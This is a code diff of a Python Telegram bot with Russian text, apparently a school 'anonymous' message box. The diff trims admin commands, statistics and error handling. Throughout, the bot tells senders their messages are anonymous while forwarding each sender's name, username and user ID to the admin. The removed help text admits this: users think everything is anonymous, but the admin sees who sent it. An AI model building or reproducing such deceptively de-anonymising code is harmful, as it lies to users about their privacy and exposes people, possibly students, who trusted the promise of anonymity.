@@ -13,7 +13,6 @@ logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
-logger = logging.getLogger(__name__)
 
 # Хранилище
 messages = []
@@ -60,8 +59,7 @@ def message_handler(update: Update, context: CallbackContext):
     update.message.reply_text(
         f"✅ Сообщение отправлено анонимно!\n\n"
         f"ID: #{msg_data['id']}\n"
-        f"Категория: {msg_data['category']}\n\n"
-        f"Спасибо! 🏫"
+        f"Категория: {msg_data['category']}"
     )
     
     # Уведомление админу
@@ -72,8 +70,7 @@ def message_handler(update: Update, context: CallbackContext):
         f"🕒 {msg_data['time']}\n"
         f"{user_info}\n"
         f"🆔 {msg_data['user_id']}\n\n"
-        f"📝 {msg_data['text']}\n\n"
-        f"💬 /view - просмотр"
+        f"📝 {msg_data['text']}"
     )
     
     del user_sessions[user_id]
@@ -89,86 +86,29 @@ def view_messages(update: Update, context: CallbackContext):
     
     # Показываем последние 5 сообщений
     recent = messages[-5:][::-1]
-    response = "📋 Последние сообщения:\n\n"
+    response = "📋 Сообщения:\n\n"
     
     for msg in recent:
-        response += (
-            f"#{msg['id']} {msg['category']}\n"
-            f"👤 {msg['name']} (@{msg['username']})\n"
-            f"📝 {msg['text'][:60]}...\n\n"
-        )
+        response += f"#{msg['id']} {msg['category']}\n👤 {msg['name']} (@{msg['username']})\n📝 {msg['text'][:50]}...\n\n"
     
-    response += f"📊 Всего сообщений: {len(messages)}"
     update.message.reply_text(response)
-
-def stats(update: Update, context: CallbackContext):
-    if update.effective_user.id != ADMIN_CHAT_ID:
-        update.message.reply_text("❌ Нет доступа")
-        return
-    
-    if not messages:
-        update.message.reply_text("📊 Сообщений нет")
-        return
-    
-    # Статистика по категориям
-    categories = {}
-    users = set()
-    
-    for msg in messages:
-        categories[msg['category']] = categories.get(msg['category'], 0) + 1
-        users.add(msg['user_id'])
-    
-    stats_text = (
-        f"📊 Статистика\n\n"
-        f"• Всего сообщений: {len(messages)}\n"
-        f"• Уникальных отправителей: {len(users)}\n\n"
-    )
-    
-    for category, count in categories.items():
-        stats_text += f"• {category}: {count}\n"
-    
-    update.message.reply_text(stats_text)
-
-def help_cmd(update: Update, context: CallbackContext):
-    if update.effective_user.id == ADMIN_CHAT_ID:
-        text = (
-            "👑 Команды админа:\n"
-            "/view - просмотр сообщений\n"
-            "/stats - статистика\n\n"
-            "🔒 Пользователи думают что всё анонимно\n"
-            "👀 Вы видите отправителей"
-        )
-    else:
-        text = "🤖 /start - отправить сообщение\n🔒 Всё анонимно"
-    
-    update.message.reply_text(text)
-
-def error_handler(update: Update, context: CallbackContext):
-    logger.error(f"Ошибка: {context.error}")
 
 def main():
     # Создаем Updater
     updater = Updater(BOT_TOKEN, use_context=True)
     
-    # Получаем dispatcher для регистрации обработчиков
+    # Получаем dispatcher
     dp = updater.dispatcher
     
     # Добавляем обработчики
     dp.add_handler(CommandHandler("start", start))
     dp.add_handler(CommandHandler("view", view_messages))
-    dp.add_handler(CommandHandler("stats", stats))
-    dp.add_handler(CommandHandler("help", help_cmd))
     dp.add_handler(CallbackQueryHandler(button_handler))
     dp.add_handler(MessageHandler(Filters.text & ~Filters.command, message_handler))
     
-    # Обработчик ошибок
-    dp.add_error_handler(error_handler)
-    
     # Запускаем бота
-    print("🚀 Бот запущен на Render!")
+    print("🚀 Бот запущен!")
     updater.start_polling()
-    
-    # Запускаем бота до принудительной остановки
     updater.idle()
 
 if __name__ == '__main__':
